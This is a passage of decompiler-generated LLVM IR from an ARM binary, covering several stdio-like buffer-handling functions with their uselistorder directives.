bb24:                                             ; preds = %.preheader, %dec_label_pc_15ff0
  %v2_15fdc = phi i32 [ %v2_15fdc.pre, %.preheader ], [ %v1_15ff4, %dec_label_pc_15ff0 ]
  %v0_15fd0 = load i32, i32* %r6.global-to-local, align 4
  %v1_15fd0 = inttoptr i32 %v0_15fd0 to i8*
  %v2_15fd0 = load i8, i8* %v1_15fd0, align 1
  %v3_15fd0 = zext i8 %v2_15fd0 to i32
  store i32 %v3_15fd0, i32* %r3.global-to-local, align 4
  %v7_15fd4 = icmp eq i8 %v2_15fd0, 10
  store i1 %v7_15fd4, i1* %cpsr_z.global-to-local, align 1
  %v1_15fd8 = add i32 %v0_15fd0, 1
  store i32 %v1_15fd8, i32* %r6.global-to-local, align 4
  %v3_15fdc = inttoptr i32 %v2_15fdc to i8*
  store i8 %v2_15fd0, i8* %v3_15fdc, align 1
  %v0_15fe0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_15fe0, label %dec_label_pc_15fe4, label %dec_label_pc_15ff0

dec_label_pc_15fe4:                               ; preds = %bb24
  %v0_15fe4 = load i32, i32* %r4.global-to-local, align 4
  %v1_15fe4 = inttoptr i32 %v0_15fe4 to i16*
  %v2_15fe4 = load i16, i16* %v1_15fe4, align 2
  %v3_15fe4 = zext i16 %v2_15fe4 to i32
  store i32 %v3_15fe4, i32* %r3.global-to-local, align 4
  %v1_15fe8 = and i32 %v3_15fe4, 256
  %v2_15fe8 = icmp eq i32 %v1_15fe8, 0
  store i1 %v2_15fe8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15fe8, label %dec_label_pc_15ff0, label %dec_label_pc_15fe4.dec_label_pc_15ffc_crit_edge

dec_label_pc_15fe4.dec_label_pc_15ffc_crit_edge:  ; preds = %dec_label_pc_15fe4
  %v0_16000.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_15ffc

dec_label_pc_15ff0:                               ; preds = %dec_label_pc_15fe4, %bb24
  %v0_15ff0 = load i32, i32* %r2.global-to-local, align 4
  %v1_15ff0 = add i32 %v0_15ff0, -1
  store i32 %v1_15ff0, i32* %r2.global-to-local, align 4
  %v7_15ff0 = icmp eq i32 %v0_15ff0, 1
  store i1 %v7_15ff0, i1* %cpsr_z.global-to-local, align 1
  %v0_15ff4 = load i32, i32* %r1.global-to-local, align 4
  %v1_15ff4 = add i32 %v0_15ff4, 1
  store i32 %v1_15ff4, i32* %r1.global-to-local, align 4
  br i1 %v7_15ff0, label %dec_label_pc_15ff0.dec_label_pc_15ffc_crit_edge, label %bb24

dec_label_pc_15ff0.dec_label_pc_15ffc_crit_edge:  ; preds = %dec_label_pc_15ff0
  %v0_15ffc.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_15ffc

dec_label_pc_15ffc:                               ; preds = %dec_label_pc_15fe4.dec_label_pc_15ffc_crit_edge, %dec_label_pc_15ff0.dec_label_pc_15ffc_crit_edge
  %v0_16000 = phi i32 [ %v1_15ff4, %dec_label_pc_15ff0.dec_label_pc_15ffc_crit_edge ], [ %v0_16000.pre, %dec_label_pc_15fe4.dec_label_pc_15ffc_crit_edge ]
  %v0_15ffc = phi i32 [ %v0_15ffc.pre, %dec_label_pc_15ff0.dec_label_pc_15ffc_crit_edge ], [ %v0_15fe4, %dec_label_pc_15fe4.dec_label_pc_15ffc_crit_edge ]
  %v1_15ffc = add i32 %v0_15ffc, 8
  %v2_15ffc = inttoptr i32 %v1_15ffc to i32*
  %v3_15ffc = load i32, i32* %v2_15ffc, align 4
  store i32 %v3_15ffc, i32* %r3.global-to-local, align 4
  %v2_16000 = add i32 %v0_15ffc, 16
  %v3_16000 = inttoptr i32 %v2_16000 to i32*
  store i32 %v0_16000, i32* %v3_16000, align 4
  %v0_16004 = load i32, i32* %r3.global-to-local, align 4
  %v1_16004 = load i32, i32* %r1.global-to-local, align 4
  %v2_16004 = sub i32 %v1_16004, %v0_16004
  store i32 %v2_16004, i32* %r3.global-to-local, align 4
  %v1_16008 = load i32, i32* %r5.global-to-local, align 4
  %v2_16008 = sub i32 %v1_16008, %v2_16004
  store i32 %v2_16008, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1600c

dec_label_pc_1600c:                               ; preds = %dec_label_pc_15fac.dec_label_pc_1600c_crit_edge, %dec_label_pc_15ffc
  %v0_1600c = phi i32 [ %v0_1600c.pre, %dec_label_pc_15fac.dec_label_pc_1600c_crit_edge ], [ %v2_16008, %dec_label_pc_15ffc ]
  %v1_1600c = load i32, i32* @r7, align 4
  %v2_1600c = sub i32 %v1_1600c, %v0_1600c
  br label %dec_label_pc_16010

dec_label_pc_15f80.dec_label_pc_16010.loopexit_crit_edge: ; preds = %dec_label_pc_15f80thread-pre-split
  %v0_16010.pre.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_16010

dec_label_pc_16010:                               ; preds = %dec_label_pc_15f68, %dec_label_pc_15f80.dec_label_pc_16010.loopexit_crit_edge, %dec_label_pc_1600c
  %v0_16010 = phi i32 [ %v2_1600c, %dec_label_pc_1600c ], [ %v0_16010.pre.pre, %dec_label_pc_15f80.dec_label_pc_16010.loopexit_crit_edge ], [ 0, %dec_label_pc_15f68 ]
  %v2_16014 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_16014, i32* %r4.global-to-local, align 4
  ret i32 %v0_16010

; uselistorder directives
  uselistorder i32 %v0_15ffc, { 1, 0 }
  uselistorder i32 %v1_15ff4, { 0, 2, 1 }
  uselistorder i32 %v0_15ff0, { 1, 0 }
  uselistorder i32 %v1_15fc8, { 0, 2, 1 }
  uselistorder i32 %v0_15fc8, { 1, 0 }
  uselistorder i32 %v5_15fb4, { 1, 0 }
  uselistorder i32 %v2_15fb4, { 1, 0, 2 }
  uselistorder i32 %v3_15f98, { 2, 3, 0, 1 }
  uselistorder i32 %v0_15f90, { 1, 0 }
  uselistorder i32 %v5_15fa4, { 2, 0, 1, 3 }
  uselistorder i32* %r6.global-to-local, { 0, 2, 1, 3, 4 }
  uselistorder i32* %r5.global-to-local, { 0, 2, 3, 5, 1, 4, 6 }
  uselistorder i32* %r4.global-to-local, { 0, 4, 1, 2, 3, 5 }
  uselistorder i32* %r2.global-to-local, { 1, 3, 2, 4, 5, 6, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 1, 3, 5, 4, 6, 7, 8, 0 }
  uselistorder i32 256, { 282, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 274, 283, 280, 281, 284, 36, 38, 37, 39, 273, 40, 41, 42, 0, 279, 1, 43, 44, 45, 46, 48, 49, 50, 47, 52, 53, 54, 51, 55, 277, 56, 285, 286, 57, 58, 59, 288, 60, 61, 62, 63, 64, 65, 66, 67, 68, 71, 70, 69, 72, 278, 289, 287, 73, 74, 75, 76, 78, 77, 79, 81, 80, 82, 84, 83, 85, 290, 86, 291, 95, 90, 96, 91, 92, 87, 88, 97, 93, 89, 94, 98, 99, 100, 101, 102, 103, 104, 111, 108, 112, 109, 113, 110, 105, 106, 107, 114, 115, 116, 117, 127, 123, 118, 128, 124, 129, 125, 119, 120, 121, 130, 126, 122, 131, 132, 133, 134, 135, 136, 2, 137, 3, 146, 142, 147, 143, 138, 139, 140, 148, 144, 149, 145, 141, 150, 151, 152, 153, 154, 164, 165, 159, 166, 160, 155, 156, 161, 167, 162, 168, 163, 157, 158, 169, 170, 171, 172, 177, 175, 173, 178, 176, 174, 179, 180, 182, 184, 185, 183, 181, 186, 275, 292, 187, 189, 188, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 204, 202, 200, 205, 203, 201, 206, 207, 209, 211, 212, 210, 208, 213, 276, 293, 214, 216, 215, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 4, 229, 234, 241, 235, 242, 236, 230, 231, 243, 237, 232, 238, 244, 239, 233, 240, 245, 246, 247, 248, 249, 250, 255, 262, 256, 263, 257, 251, 252, 264, 258, 253, 259, 265, 260, 254, 261, 266, 267, 268, 269, 270, 271, 272 }
  uselistorder i8 10, { 2, 3, 0, 1 }
  uselistorder i32 (i32, i32)* @function_10ce8, { 2, 1, 0 }
  uselistorder i32 4, { 202, 203, 204, 196, 197, 326, 205, 454, 5, 6, 206, 7, 8, 68, 0, 9, 76, 71, 72, 10, 455, 73, 456, 59, 11, 12, 74, 457, 458, 459, 460, 461, 462, 463, 464, 465, 466, 467, 468, 469, 470, 471, 472, 473, 13, 474, 475, 476, 477, 478, 479, 58, 480, 481, 482, 483, 484, 485, 14, 15, 75, 486, 207, 93, 208, 16, 209, 94, 210, 211, 212, 213, 129, 214, 215, 216, 217, 218, 219, 17, 198, 199, 200, 201, 278, 279, 191, 192, 193, 194, 195, 487, 130, 95, 488, 18, 489, 131, 132, 60, 395, 396, 397, 398, 399, 400, 133, 134, 19, 401, 402, 403, 404, 405, 406, 407, 408, 135, 393, 394, 369, 370, 371, 372, 373, 374, 375, 376, 377, 20, 378, 379, 380, 409, 21, 410, 411, 412, 413, 414, 415, 416, 417, 418, 419, 420, 421, 422, 423, 136, 137, 138, 424, 425, 428, 431, 426, 427, 96, 139, 429, 51, 430, 432, 433, 434, 436, 140, 23, 22, 435, 141, 142, 143, 246, 144, 52, 24, 25, 280, 281, 282, 283, 284, 26, 285, 437, 438, 190, 27, 28, 97, 247, 61, 248, 101, 249, 102, 239, 103, 240, 104, 241, 250, 251, 29, 252, 77, 98, 99, 232, 233, 242, 243, 100, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 234, 235, 236, 237, 238, 244, 245, 54, 53, 253, 69, 254, 30, 255, 31, 56, 55, 257, 32, 256, 258, 259, 264, 105, 266, 106, 267, 107, 268, 269, 265, 260, 108, 261, 262, 263, 439, 270, 67, 66, 65, 271, 109, 33, 34, 35, 36, 37, 38, 272, 63, 62, 273, 64, 110, 274, 275, 276, 111, 277, 39, 293, 294, 295, 145, 296, 297, 298, 299, 146, 147, 112, 300, 113, 302, 78, 303, 304, 305, 148, 306, 307, 149, 150, 308, 79, 309, 80, 310, 311, 151, 312, 313, 152, 153, 314, 114, 315, 81, 316, 154, 155, 156, 317, 318, 115, 82, 319, 320, 157, 321, 322, 323, 158, 159, 1, 116, 324, 83, 325, 327, 328, 160, 329, 330, 161, 162, 2, 117, 331, 84, 333, 85, 334, 335, 336, 337, 163, 338, 339, 164, 165, 340, 341, 118, 342, 3, 343, 86, 344, 119, 345, 346, 347, 348, 166, 349, 350, 167, 168, 351, 352, 120, 353, 4, 354, 87, 355, 121, 356, 169, 170, 171, 357, 358, 122, 88, 359, 360, 361, 362, 172, 363, 364, 173, 174, 124, 365, 123, 366, 89, 367, 90, 368, 440, 441, 442, 443, 444, 126, 445, 127, 446, 175, 447, 57, 448, 176, 177, 128, 449, 125, 450, 91, 451, 92, 453, 178, 40, 381, 179, 41, 382, 180, 42, 383, 181, 43, 384, 182, 44, 385, 183, 70, 45, 386, 387, 184, 46, 388, 185, 47, 389, 186, 48, 390, 187, 49, 391, 188, 50, 392, 452, 332, 286, 287, 288, 289, 290, 291, 189, 292, 301 }
  uselistorder i32 2147483647, { 1, 6, 0, 2, 3, 4, 5 }
  uselistorder i32* @r7, { 3, 36, 37, 25, 26, 27, 28, 29, 30, 31, 32, 35, 4, 38, 39, 40, 5, 41, 42, 43, 19, 44, 45, 6, 46, 47, 48, 49, 50, 51, 7, 52, 53, 54, 55, 56, 57, 33, 34, 334, 335, 201, 202, 296, 297, 24, 336, 337, 338, 343, 344, 8, 58, 59, 9, 129, 130, 131, 0, 132, 298, 299, 300, 301, 302, 303, 304, 305, 306, 279, 280, 281, 282, 283, 284, 307, 308, 309, 310, 311, 312, 313, 314, 10, 315, 316, 317, 318, 319, 260, 261, 80, 81, 133, 134, 82, 83, 262, 263, 264, 265, 84, 85, 148, 149, 150, 151, 152, 157, 158, 159, 160, 161, 153, 154, 155, 156, 162, 163, 164, 165, 166, 167, 320, 321, 341, 342, 86, 87, 88, 89, 252, 253, 339, 340, 209, 210, 168, 169, 203, 204, 135, 136, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 322, 323, 21, 324, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 76, 77, 63, 60, 11, 61, 1, 62, 75, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 78, 79, 114, 115, 116, 117, 118, 119, 120, 211, 212, 213, 214, 121, 122, 123, 124, 125, 126, 127, 128, 137, 138, 12, 139, 140, 141, 142, 143, 144, 145, 146, 147, 180, 181, 182, 183, 184, 185, 186, 187, 188, 215, 216, 217, 218, 219, 220, 221, 222, 13, 223, 224, 225, 226, 227, 228, 229, 230, 14, 231, 232, 233, 16, 15, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 22, 247, 248, 249, 250, 251, 254, 23, 255, 256, 257, 258, 259, 18, 17, 266, 267, 268, 269, 270, 271, 2, 272, 273, 274, 275, 276, 277, 278, 325, 326, 327, 328, 329, 330, 331, 332, 333, 285, 286, 287, 288, 289, 290, 291, 292, 293, 294, 295, 191, 189, 190, 20, 192, 193, 194, 195, 196, 197, 198, 199, 200, 205, 206, 207, 208 }
  uselistorder i32 %arg3, { 1, 0, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_16010, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1600c, { 1, 0 }
  uselistorder label %dec_label_pc_15ffc, { 1, 0 }
  uselistorder label %bb24, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_15f88, { 1, 0 }
}

define i32 @function_1601c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1601c:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1601c = load i32, i32* @r4, align 4
  store i32 %v3_1601c, i32* %stack_var_-8, align 4
  %v1_16020 = add i32 %arg1, 8
  %v1_16024 = inttoptr i32 %v1_16020 to i32*
  %v2_16024 = load i32, i32* %v1_16024, align 4
  %v3_16024 = add i32 %arg1, 12
  %v4_16024 = inttoptr i32 %v3_16024 to i32*
  %v5_16024 = load i32, i32* %v4_16024, align 4
  %v2_16028 = sub i32 %v5_16024, %v2_16024
  store i32 %v2_16028, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* @r4, align 4
  %v3_16030 = inttoptr i32 %arg1 to i16*
  %v4_16030 = call i32 @function_15f10(i16* %v3_16030, i32 %v2_16024, i32 %v2_16028)
  %v0_16034 = load i32, i32* @r4, align 4
  %v1_16034 = add i32 %v0_16034, 8
  %v2_16034 = inttoptr i32 %v1_16034 to i32*
  %v3_16034 = load i32, i32* %v2_16034, align 4
  store i32 %v3_16034, i32* %r2.global-to-local, align 4
  %v2_16038 = add i32 %v3_16034, %v4_16030
  %v2_1603c = add i32 %v0_16034, 20
  %v3_1603c = inttoptr i32 %v2_1603c to i32*
  store i32 %v2_16038, i32* %v3_1603c, align 4
  %v0_16040 = load i32, i32* %r2.global-to-local, align 4
  %v1_16040 = load i32, i32* @r4, align 4
  %v2_16040 = add i32 %v1_16040, 16
  %v3_16040 = inttoptr i32 %v2_16040 to i32*
  store i32 %v0_16040, i32* %v3_16040, align 4
  %v2_16044 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_16044, i32* @r4, align 4
  ret i32 %v4_16030

; uselistorder directives
  uselistorder i32 %v4_16030, { 1, 0 }
  uselistorder i32 20, { 32, 115, 3, 116, 117, 1, 118, 33, 7, 34, 35, 36, 37, 31, 46, 47, 27, 28, 29, 30, 119, 8, 120, 107, 108, 109, 2, 48, 9, 49, 50, 0, 38, 40, 4, 42, 10, 43, 26, 41, 39, 44, 45, 11, 12, 13, 14, 52, 15, 53, 54, 55, 56, 57, 58, 16, 59, 60, 61, 62, 63, 64, 17, 65, 66, 67, 68, 69, 70, 71, 72, 73, 18, 74, 75, 76, 77, 78, 79, 80, 81, 19, 82, 83, 84, 85, 86, 87, 20, 88, 89, 21, 90, 91, 92, 93, 22, 94, 95, 23, 96, 97, 98, 99, 100, 101, 102, 5, 103, 24, 104, 105, 106, 110, 6, 111, 25, 112, 113, 114, 51 }
  uselistorder i32 12, { 9, 10, 40, 11, 12, 43, 6, 172, 173, 174, 175, 176, 178, 179, 177, 180, 181, 182, 183, 184, 185, 186, 13, 14, 15, 16, 18, 17, 19, 44, 45, 20, 46, 47, 48, 49, 50, 41, 42, 88, 89, 37, 38, 39, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 3, 121, 122, 123, 124, 125, 21, 126, 144, 22, 23, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 163, 156, 157, 158, 159, 160, 161, 162, 164, 165, 24, 166, 4, 90, 91, 25, 92, 93, 26, 67, 68, 69, 54, 70, 51, 71, 62, 52, 53, 55, 56, 57, 58, 59, 60, 61, 64, 27, 63, 28, 65, 29, 66, 72, 73, 74, 5, 75, 76, 77, 78, 80, 81, 36, 82, 30, 83, 31, 84, 32, 85, 87, 86, 79, 167, 94, 33, 95, 96, 97, 98, 99, 100, 101, 34, 102, 103, 104, 35, 105, 106, 107, 108, 109, 110, 7, 111, 112, 113, 114, 115, 116, 8, 117, 118, 119, 120, 168, 169, 170, 171, 0, 1, 2 }
  uselistorder i32 %arg1, { 3, 2, 1, 0 }
}

define i32 @function_1604c() local_unnamed_addr {
dec_label_pc_1604c:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_1604c = load i32, i32* @r4, align 4
  store i32 %v3_1604c, i32* %stack_var_-12, align 4
  %v0_16050 = load i32, i32* @r0, align 4
  %v1_16050 = inttoptr i32 %v0_16050 to i16*
  %v2_16050 = load i16, i16* %v1_16050, align 2
  %v3_16050 = zext i16 %v2_16050 to i32
  store i32 %v3_16050, i32* %r3.global-to-local, align 4
  %v0_16054 = load i32, i32* @r1, align 4
  %v2_16054 = and i32 %v0_16054, %v3_16050
  %v4_16054 = icmp eq i32 %v2_16054, 0
  store i32 %v0_16050, i32* @r4, align 4
  br i1 %v4_16054, label %dec_label_pc_16064, label %dec_label_pc_16074

dec_label_pc_16064:                               ; preds = %dec_label_pc_1604c
  %v1_16064 = and i32 %v3_16050, 2176
  %v2_16064 = icmp eq i32 %v1_16064, 0
  br i1 %v2_16064, label %dec_label_pc_1606c, label %dec_label_pc_16080

dec_label_pc_1606c:                               ; preds = %dec_label_pc_16064
  %v2_1606c = or i32 %v0_16054, %v3_16050
  store i32 %v2_1606c, i32* %r3.global-to-local, align 4
  %v1_16070 = trunc i32 %v2_1606c to i16
  store i16 %v1_16070, i16* %v1_16050, align 2
  %v0_16074.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_16074

dec_label_pc_16074:                               ; preds = %dec_label_pc_1604c, %dec_label_pc_1606c
  %v0_16074 = phi i32 [ %v0_16050, %dec_label_pc_1604c ], [ %v0_16074.pre, %dec_label_pc_1606c ]
  %v1_16074 = inttoptr i32 %v0_16074 to i16*
  %v2_16074 = load i16, i16* %v1_16074, align 2
  %v3_16074 = zext i16 %v2_16074 to i32
  store i32 %v3_16074, i32* %r3.global-to-local, align 4
  %v1_16078 = and i32 %v3_16074, 16
  store i32 %v1_16078, i32* %r5.global-to-local, align 4
  %v2_16078 = icmp eq i32 %v1_16078, 0
  br i1 %v2_16078, label %dec_label_pc_160a0, label %dec_label_pc_16080

dec_label_pc_16080:                               ; preds = %dec_label_pc_16064, %dec_label_pc_16074
  %v0_16080 = call i32 @function_11204()
  store i32 %v0_16080, i32* %r0.global-to-local, align 4
  store i32 9, i32* %r3.global-to-local, align 4
  %v2_16088 = inttoptr i32 %v0_16080 to i32*
  store i32 9, i32* %v2_16088, align 4
  br label %dec_label_pc_1608c

dec_label_pc_1608c:                               ; preds = %dec_label_pc_160a8, %dec_label_pc_16080
  %v0_1608c = load i32, i32* @r4, align 4
  %v1_1608c = inttoptr i32 %v0_1608c to i16*
  %v2_1608c = load i16, i16* %v1_1608c, align 2
  %v3_1608c = zext i16 %v2_1608c to i32
  store i32 -1, i32* %r0.global-to-local, align 4
  %v1_16094 = or i32 %v3_1608c, 8
  store i32 %v1_16094, i32* %r3.global-to-local, align 4
  %v1_16098 = trunc i32 %v1_16094 to i16
  store i16 %v1_16098, i16* %v1_1608c, align 2
  %v1_160e0.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_160d8

dec_label_pc_160a0:                               ; preds = %dec_label_pc_16074
  %v1_160a0 = and i32 %v3_16074, 64
  %v2_160a0 = icmp eq i32 %v1_160a0, 0
  br i1 %v2_160a0, label %dec_label_pc_160c8, label %dec_label_pc_160a8

dec_label_pc_160a8:                               ; preds = %dec_label_pc_160a0
  %v0_160a8 = load i32, i32* @r0, align 4
  %v1_160a8 = call i32 @function_14c84(i32 %v0_160a8)
  store i32 %v1_160a8, i32* %r0.global-to-local, align 4
  %v2_160ac = icmp eq i32 %v1_160a8, 0
  br i1 %v2_160ac, label %dec_label_pc_160b4, label %dec_label_pc_1608c

dec_label_pc_160b4:                               ; preds = %dec_label_pc_160a8
  %v0_160b4 = load i32, i32* @r4, align 4
  %v1_160b4 = inttoptr i32 %v0_160b4 to i16*
  %v2_160b4 = load i16, i16* %v1_160b4, align 2
  %v3_160b4 = zext i16 %v2_160b4 to i32
  store i32 %v3_160b4, i32* %r3.global-to-local, align 4
  %v1_160b8 = add i32 %v0_160b4, 8
  %v2_160b8 = inttoptr i32 %v1_160b8 to i32*
  %v3_160b8 = load i32, i32* %v2_160b8, align 4
  %v1_160bc = and i32 %v3_160b4, 65471
  store i32 %v1_160bc, i32* %r3.global-to-local, align 4
  %v2_160c0 = add i32 %v0_160b4, 28
  %v3_160c0 = inttoptr i32 %v2_160c0 to i32*
  store i32 %v3_160b8, i32* %v3_160c0, align 4
  %v0_160c4 = load i32, i32* %r3.global-to-local, align 4
  %v1_160c4 = trunc i32 %v0_160c4 to i16
  %v2_160c4 = load i32, i32* @r4, align 4
  %v3_160c4 = inttoptr i32 %v2_160c4 to i16*
  store i16 %v1_160c4, i16* %v3_160c4, align 2
  %v0_160c8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_160c8

dec_label_pc_160c8:                               ; preds = %dec_label_pc_160a0, %dec_label_pc_160b4
  %v2_160d0 = phi i32 [ %v0_16074, %dec_label_pc_160a0 ], [ %v0_160c8.pre, %dec_label_pc_160b4 ]
  %v1_160c8 = inttoptr i32 %v2_160d0 to i16*
  %v2_160c8 = load i16, i16* %v1_160c8, align 2
  %v3_160c8 = zext i16 %v2_160c8 to i32
  %v1_160cc = or i32 %v3_160c8, 1
  store i32 %v1_160cc, i32* %r3.global-to-local, align 4
  %v1_160d0 = trunc i32 %v1_160cc to i16
  store i16 %v1_160d0, i16* %v1_160c8, align 2
  %v0_160d4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_160d4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_160d8

dec_label_pc_160d8:                               ; preds = %dec_label_pc_1608c, %dec_label_pc_160c8
  %v1_160e0 = phi i32 [ %v1_160e0.pre, %dec_label_pc_1608c ], [ %v0_160d4, %dec_label_pc_160c8 ]
  %v2_160dc = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_160dc, i32* @r4, align 4
  ret i32 %v1_160e0

; uselistorder directives
  uselistorder i32 %v3_16050, { 0, 2, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 0, 3, 1, 2, 4 }
  uselistorder i32 28, { 23, 52, 7, 24, 25, 26, 40, 41, 21, 10, 22, 11, 12, 13, 14, 49, 50, 51, 8, 15, 19, 29, 0, 27, 16, 28, 17, 30, 18, 31, 1, 32, 2, 33, 3, 34, 4, 35, 5, 36, 6, 37, 9, 20, 39, 38, 42, 43, 44, 45, 46, 47, 48 }
  uselistorder i32 65471, { 2, 1, 0 }
  uselistorder i32 (i32)* @function_14c84, { 2, 1, 0 }
  uselistorder i32 64, { 13, 14, 15, 16, 20, 9, 10, 11, 12, 52, 17, 18, 19, 21, 22, 6, 23, 24, 25, 0, 26, 27, 28, 7, 29, 30, 31, 8, 32, 33, 34, 1, 35, 36, 37, 2, 38, 39, 40, 3, 41, 42, 43, 44, 45, 4, 46, 47, 48, 49, 50, 5, 51 }
  uselistorder i32 8, { 70, 71, 72, 73, 74, 75, 76, 63, 64, 65, 66, 127, 77, 219, 34, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 78, 79, 80, 81, 82, 83, 84, 28, 85, 86, 87, 88, 89, 90, 91, 92, 93, 67, 68, 69, 109, 110, 111, 45, 237, 238, 29, 164, 165, 166, 167, 168, 169, 170, 171, 7, 55, 172, 173, 174, 175, 176, 177, 178, 179, 8, 151, 152, 153, 154, 155, 156, 157, 158, 180, 181, 182, 183, 184, 9, 185, 186, 10, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 204, 197, 198, 199, 200, 56, 23, 201, 202, 203, 57, 58, 11, 205, 206, 207, 208, 210, 211, 59, 12, 212, 13, 209, 37, 38, 35, 36, 25, 26, 31, 32, 39, 239, 112, 113, 114, 115, 46, 61, 30, 14, 15, 22, 16, 40, 98, 99, 17, 18, 19, 100, 50, 94, 47, 95, 48, 96, 49, 97, 62, 33, 101, 102, 103, 24, 27, 105, 20, 51, 106, 52, 107, 108, 104, 118, 41, 119, 120, 121, 122, 123, 124, 125, 126, 3, 128, 129, 130, 4, 131, 132, 133, 134, 135, 136, 137, 5, 138, 139, 140, 141, 142, 143, 144, 6, 145, 146, 147, 148, 149, 150, 213, 214, 215, 216, 217, 218, 159, 42, 160, 43, 161, 44, 162, 53, 163, 0, 1, 60, 21, 116, 54, 117, 2 }
  uselistorder i32 9, { 5, 29, 24, 25, 57, 59, 6, 44, 4, 45, 7, 35, 30, 8, 9, 31, 10, 32, 11, 33, 12, 34, 26, 36, 2, 27, 28, 37, 13, 38, 14, 39, 15, 40, 16, 17, 18, 41, 42, 19, 43, 0, 20, 1, 21, 60, 46, 47, 22, 48, 49, 50, 51, 52, 53, 54, 55, 56, 61, 62, 3, 58, 23 }
  uselistorder i32 16, { 118, 119, 120, 112, 113, 114, 115, 121, 33, 34, 35, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 122, 123, 124, 125, 126, 2, 1, 25, 51, 52, 53, 54, 129, 55, 130, 127, 128, 56, 57, 131, 9, 58, 59, 132, 133, 60, 61, 134, 135, 116, 117, 62, 154, 155, 108, 109, 110, 111, 63, 26, 149, 36, 64, 65, 66, 222, 223, 224, 225, 67, 226, 3, 68, 227, 228, 0, 229, 230, 69, 24, 156, 70, 157, 71, 72, 10, 23, 11, 12, 4, 13, 14, 73, 138, 37, 139, 140, 74, 136, 141, 137, 144, 145, 38, 107, 146, 75, 76, 15, 102, 16, 17, 77, 142, 143, 41, 40, 39, 147, 42, 148, 43, 78, 79, 80, 81, 82, 83, 84, 85, 150, 86, 151, 87, 152, 88, 153, 89, 90, 91, 92, 44, 231, 93, 159, 160, 161, 162, 27, 163, 164, 165, 166, 167, 28, 168, 169, 170, 171, 94, 45, 172, 173, 29, 174, 175, 18, 176, 177, 5, 95, 178, 179, 180, 30, 181, 182, 183, 184, 185, 6, 96, 186, 31, 187, 188, 189, 19, 190, 191, 103, 20, 104, 192, 97, 98, 193, 194, 7, 47, 195, 46, 196, 32, 197, 198, 199, 21, 200, 201, 105, 22, 106, 202, 99, 100, 203, 204, 8, 49, 205, 48, 206, 207, 101, 50, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 219, 218, 220, 221, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 243, 242, 244, 245, 158 }
  uselistorder i32* @r1, { 15, 14, 62, 16, 17, 18, 19, 1, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 2, 95, 96, 20, 21, 22, 23, 0, 44, 45, 10, 24, 37, 38, 39, 3, 70, 68, 69, 4, 71, 5, 29, 30, 11, 63, 54, 55, 7, 25, 46, 12, 72, 73, 47, 8, 74, 48, 49, 31, 26, 27, 28, 33, 32, 56, 34, 35, 36, 40, 41, 42, 43, 50, 51, 52, 9, 53, 75, 76, 6, 57, 58, 59, 60, 61, 64, 65, 66, 67, 77, 13 }
  uselistorder label %dec_label_pc_160d8, { 1, 0 }
  uselistorder label %dec_label_pc_160c8, { 1, 0 }
  uselistorder label %dec_label_pc_16080, { 1, 0 }
  uselistorder label %dec_label_pc_16074, { 1, 0 }
}

define i32 @function_160e4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_160e4:
  store i32 %arg2, i32* @r2, align 4
  store i32 %arg1, i32* @r0, align 4
  %v6_160e4 = load i32, i32* @r5, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 %arg2, i32* @r4, align 4
  %v0_160f4 = call i32 @function_11310()
  %v0_160f8 = load i32, i32* @r5, align 4
  %v1_160f8 = load i32, i32* @r4, align 4
  %v2_160f8 = add i32 %v1_160f8, %v0_160f8
  store i32 %v6_160e4, i32* @r5, align 4
  ret i32 %v2_160f8

; uselistorder directives
  uselistorder i32 ()* @function_11310, { 6, 7, 3, 0, 2, 1, 5, 4 }
